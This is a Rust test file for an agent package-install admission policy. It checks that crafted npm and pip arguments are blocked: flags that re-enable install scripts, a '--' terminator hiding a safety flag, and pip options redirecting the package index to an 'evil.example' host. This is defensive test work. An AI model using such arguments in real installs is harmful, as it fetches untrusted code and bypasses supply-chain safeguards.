use wardnet_agent_artifact_admission::{
    AdmissionPolicy, ApprovedArtifact, ApprovedManifest, DecisionKind, InstallIntent,
    admission_decision,
};

fn approved_npm_policy() -> AdmissionPolicy {
    let mut policy = AdmissionPolicy::deny_all_for_test();
    policy.policy_id = "enterprise-default".to_string();
    policy.policy_revision = "2026-09-02.1".to_string();
    policy.allowed_executables = vec!["npm".to_string()];
    policy.approved_manifests = vec![ApprovedManifest {
        workspace_id: "ContextualWisdomLab/wardnet".to_string(),
        sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
    }];
    policy.approved_artifacts = vec![ApprovedArtifact {
        ecosystem: "npm".to_string(),
        name: "@unowned/example".to_string(),
        version: "1.2.3".to_string(),
        registry_url: "https://registry.npmjs.org".to_string(),
        owner: "Unowned".to_string(),
        sha256: "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc".to_string(),
        artifact_argument: "@unowned/example@1.2.3".to_string(),
    }];
    policy
}

fn approved_pip_policy() -> AdmissionPolicy {
    let mut policy = AdmissionPolicy::deny_all_for_test();
    policy.policy_id = "enterprise-default".to_string();
    policy.policy_revision = "2026-09-02.1".to_string();
    policy.allowed_executables = vec!["pip".to_string()];
    policy.approved_manifests = vec![ApprovedManifest {
        workspace_id: "ContextualWisdomLab/wardnet".to_string(),
        sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
    }];
    policy.approved_artifacts = vec![ApprovedArtifact {
        ecosystem: "pypi".to_string(),
        name: "example-package".to_string(),
        version: "1.2.3".to_string(),
        registry_url: "https://pypi.org/simple".to_string(),
        owner: "Example".to_string(),
        sha256: "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc".to_string(),
        artifact_argument: "example-package==1.2.3".to_string(),
    }];
    policy
}

fn approved_pip_intent(extra_argument: &str) -> InstallIntent {
    let mut intent = InstallIntent::unowned_llms_package_for_test();
    intent.argv = vec![
        "pip".to_string(),
        "install".to_string(),
        "example-package==1.2.3".to_string(),
        "--require-hashes".to_string(),
        extra_argument.to_string(),
    ];
    let artifact = intent
        .artifacts
        .first_mut()
        .expect("test helper supplies one artifact");
    artifact.ecosystem = "pypi".to_string();
    artifact.name = "example-package".to_string();
    artifact.version = "1.2.3".to_string();
    artifact.registry_url = "https://pypi.org/simple".to_string();
    artifact.owner = "Example".to_string();
    artifact.artifact_argument = "example-package==1.2.3".to_string();
    intent
}

#[test]
fn npm_boolean_overrides_cannot_reenable_install_scripts() {
    let policy = approved_npm_policy();

    for conflicting_flag in ["--ignore-scripts=false", "--no-ignore-scripts"] {
        let mut intent = InstallIntent::unowned_llms_package_for_test();
        intent.argv = vec![
            "npm".to_string(),
            "install".to_string(),
            "@unowned/example@1.2.3".to_string(),
            "--ignore-scripts".to_string(),
            conflicting_flag.to_string(),
        ];

        let decision = admission_decision(&policy, &intent);

        assert_eq!(decision.decision, DecisionKind::Block, "{conflicting_flag}");
        assert!(
            decision
                .reason_codes
                .iter()
                .any(|reason| reason.as_str() == "missing_safety_flag"),
            "{conflicting_flag}"
        );
    }
}

#[test]
fn option_terminator_cannot_hide_required_safety_flags_from_the_package_manager() {
    let policy = approved_npm_policy();
    let mut intent = InstallIntent::unowned_llms_package_for_test();
    intent.argv = vec![
        "npm".to_string(),
        "install".to_string(),
        "@unowned/example@1.2.3".to_string(),
        "--".to_string(),
        "--ignore-scripts".to_string(),
    ];

    let decision = admission_decision(&policy, &intent);

    assert_eq!(decision.decision, DecisionKind::Block);
    assert!(
        decision
            .reason_codes
            .iter()
            .any(|reason| reason.as_str() == "forbidden_command"),
        "option terminator must not create a second parser authority: {:?}",
        decision.reason_codes
    );
}

#[test]
fn pip_attached_short_options_cannot_escape_reviewed_install_capability() {
    let policy = approved_pip_policy();

    for (argument, expected_reason) in [
        ("-t/tmp/wardnet-test-target", "alternate_install_root"),
        ("-ihttps://evil.example/simple", "alternate_trust_root"),
        ("-fhttps://evil.example/wheels", "alternate_trust_root"),
    ] {
        let intent = approved_pip_intent(argument);
        let decision = admission_decision(&policy, &intent);

        assert_eq!(decision.decision, DecisionKind::Block, "{argument}");
        assert!(
            decision
                .reason_codes
                .iter()
                .any(|reason| reason.as_str() == expected_reason),
            "{argument}: {:?}",
            decision.reason_codes
        );
    }
}
